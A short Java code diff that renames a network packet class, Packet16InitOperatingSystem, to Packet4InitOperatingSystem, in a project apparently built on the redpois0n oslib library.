@@ -20,7 +20,7 @@ import com.redpois0n.oslib.osx.OSXVersion;
 import com.redpois0n.oslib.solaris.SolarisOperatingSystem;
 import com.redpois0n.oslib.windows.WindowsOperatingSystem;
 
-public class Packet16InitOperatingSystem extends AbstractIncomingPacket {
+public class Packet4InitOperatingSystem extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {	
